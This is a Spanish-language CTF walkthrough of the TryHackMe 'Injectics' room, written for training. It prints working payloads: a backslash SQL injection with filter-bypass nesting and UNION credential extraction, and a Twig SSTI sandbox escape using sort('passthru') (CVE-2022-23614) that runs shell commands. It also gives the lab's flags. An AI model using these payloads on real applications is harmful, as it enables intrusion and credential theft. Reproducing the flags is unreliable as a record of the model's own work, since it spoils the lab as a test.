# Injectics

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | Web / Pentesting | injectics | https://tryhackme.com/room/injectics | 02 Level Medium | TryHackMe | PHP 8, MySQL 8, Twig 2.14, SQLi, SSTI/RCE | Toma de control del panel admin y RCE |

---

**Contexto:** **Injectics** es una aplicación web (Apache/PHP 8 con MySQL 8 y motor de plantillas **Twig 2.14**) con dos formularios de login: el normal (`login.php` → `functions.php`, inyectable) y el de "Login as Admin" (`adminLogin007.php`, con prepared statements). Un filtro de palabras clave (cliente y un `str_replace` de una sola pasada en servidor sobre `or/and/union/select`) puede eludirse anidando substrings (`ununionion`, `passwoorrd`, `seselectlect`). La cadena: **SQLi con backslash** para romper el contexto del `password` → UNION para extraer credenciales en claro del `superadmin` → login en el panel de admin (flag 1); después, un **SSTI almacenado** en `update_profile.php` (`first_name`) renderizado en el dashboard, con escape del sandbox de Twig vía el filtro `sort` y `passthru` (**CVE-2022-23614**) → **RCE** para leer el archivo oculto de `/flags` (flag 2).

## Solucionario

### Task 1: Flag tras iniciar sesión en el panel de admin
**Explicación:**

1. **Enumeración:** `gobuster` encuentra `composer.json` (revela Twig 2.14), `/phpmyadmin` y `/mail` (un mail con credenciales por defecto `superadmin@injectics.thm:superSecurePasswd101` que solo funcionarán si se borra la tabla `users`).
2. **Bypass de filtros:** como el filtro elimina `or`, la input se rompe usando anidamiento: `or`→`oorr`, `union`→`ununionion`, `password`→`passwoorrd`, `select`→`seselectlect`. Además, la inyección debe enviarse fuera del navegador (Burp/curl) porque el filtro JS la bloquea.
3. **SQLi con backslash:** el handler concatena `... WHERE email='$user' AND password='$pass'` y escapa mal la comilla simple (no escapa `\`). Enviando `username=\` se convierte el resto en contexto SQL:
   ```
   curl -s -X POST http://<IP>/functions.php --data-urlencode function=login \
     --data-urlencode 'username=\' --data-urlencode 'password=|| 1=1-- -'
   ```
4. **Exfiltración de credenciales:** con UNION de 6 columnas (col2→`first_name`, col3→`last_name` como canales de salida):
   ```
   --data-urlencode 'password=ununionion seselectlect 1,email,passwoorrd,4,5,6 from users limit 1 offset 1-- -'
   # => superadmin@injectics.thm : 34234vsdfwr2r2wf2r2
   ```
5. **Login real:** `adminLogin007.php` no es inyectable, pero acepta las credenciales legítimas extraídas; el dashboard muestra la flag.

Respuesta: `THM{INJECTICS_ADMIN_PANEL_007}`

### Task 2: Contenido del archivo oculto en la carpeta flags
**Explicación:**

1. **Validar SSTI:** en el perfil (solo admin), el campo *First Name* se refleja en el dashboard como `Welcome, {fname}`. Enviar `{{7*7}}` devuelve `49`.
2. **Escape del sandbox de Twig:** `system`/`exec`, `_self.env` y `map/filter/reduce` con callables string están bloqueados, pero el filtro **`sort`** no fuerzaba que el callback fuera un `Closure` (CVE-2022-23614; corregido en 2.14.11). Se pasa `passthru` como string:
   ```
   fname={{['ls -la flags',""]|sort('passthru')}}&lname=x&email=superadmin@injectics.thm
   ```
3. **RCE:** `passthru` escribe la salida directamente en la página. Con `ls` se localiza el archivo de flag (nombre hex aleatorio) y con `cat` se lee:
   ```
   fname={{['cat /var/www/html/flags/* 2>&1',""]|sort('passthru')}}&lname=x&email=superadmin@injectics.thm
   ```
   Se recarga `/dashboard.php` y la flag sustituye al nombre de usuario.

Respuesta: `THM{5735172b6c147f4dd649872f73e0fdea}`

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag tras iniciar sesión en el panel de admin | `THM{INJECTICS_ADMIN_PANEL_007}` |
| 2 | Contenido del archivo oculto en la carpeta flags | `THM{5735172b6c147f4dd649872f73e0fdea}` |

---

**Metodología:** SQLi de autenticación (backslash + bypass de blacklist por anidamiento) → UNION para volcado de credenciales en claro → login admin (flag 1) → SSTI almacenado en el perfil → escape del sandbox Twig con `sort('passthru')` (CVE-2022-23614) → RCE y lectura del archivo oculto (flag 2).

**Learning chain:** Enumeración (composer.json/Twig/phpmyadmin) → filtro de keywords → backslash-SQLi → UNION creds → login admin (flag 1) → SSTI `{{7*7}}` → sandbox escape `sort('passthru')` → RCE → `/flags/*` (flag 2).

**Lección:** *Un blacklist de substrings y un escape de comillas ingenuo no son defensa: dos capas débiles (SQLi y SSTI) en la misma app permiten pasar de un bypass de login a un RCE total, y hasta un sandbox "endurecido" de Twig puede dejar una puerta abierta en el filtro `sort`.*

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · T1505.003 Web Shell · T1078 Valid Accounts · T1005 Data from Local System · T1059.006 Command and Scripting Interpreter · T1552.001 Unsecured Credentials: Credentials In Files.

**Fuente:** [TryHackMe - Injectics](https://tryhackme.com/room/injectics)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.